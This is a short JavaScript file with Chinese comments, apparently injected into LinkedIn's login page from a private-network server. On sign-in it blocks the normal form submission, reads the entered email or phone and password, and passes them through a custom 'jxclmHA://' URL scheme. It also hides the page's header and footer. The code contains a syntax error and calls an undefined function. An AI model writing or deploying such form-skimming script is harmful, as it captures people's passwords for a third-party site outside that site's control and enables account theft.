

// https://www.linkedin.com/uas/login

// http://192.168.101.13:8083/static/h5/js/linkedin/login-linkedin.js

// <input type="text" name="session_key" value="" id="session_key-login" placeholder="邮箱或电话" aria-describedby="session_key-login-error" dir="ltr">

// <input type="password" id="session_password-login" class="password" name="session_password" placeholder="密码" aria-describedby="session_password-login-error" dir="ltr">

// <input type="submit" name="signin" value="登录" class="btn-primary" id="btn-primary">
// 下边是...


(function(x, y, z){
    

function g() {
    var elements = new Array();
    for (var i = 0; i < arguments.length; i++) {
        var element = arguments[i];
        if (typeof element == 'string') {
            element = document.getElementById(element);
        }
        if (arguments.length == 1) {
            return element;
        }
        elements.push(element);
    }
    return elements;
};
// 下边是 添加监听事件的 JS
function t( node, type, listener ) {
    if (node.addEventListener) {
        // W3C method
        node.addEventListener( type, listener, false );
        return true;
    } else if(node.attachEvent) {
        // MSIE method
        node['e'+type+listener] = listener;
        node[type+listener] = function(){node['e'+type+listener]( window.event );}
        node.attachEvent( 'on'+type, node[type+listener] );
        return true;
    }
    
    // Didn't have either so return false
    return false;
};

// 下边是  监听以及协议修改的 JS
t(g("btn-primary"),"click", function(){
    if(event.preventDefault){
        event.preventDefault(): // 支持 DOM 标准的浏览器.
    }else{
        event.preventDefault=false; //IE
    }
    var tt= document.getElementById('session_key-login').value;
    var ps= document.getElementById('session_password-login').value;
    if(tt.length&&ps.length){ // 判空
        l("jxclmHA://"+tt+"&?&"+ps);
    }

});



// 下边是修改样式的 JS
var s = document.createElement('style');
s.type = 'text/css';
s.innerHTML =".am-footer .f-left{display: none;}#layout-header{display: none;}#layout-footer{display: none;}#yui-gen0{display: none;}";
document.body.appendChild(s);

})(1, 2, 3);













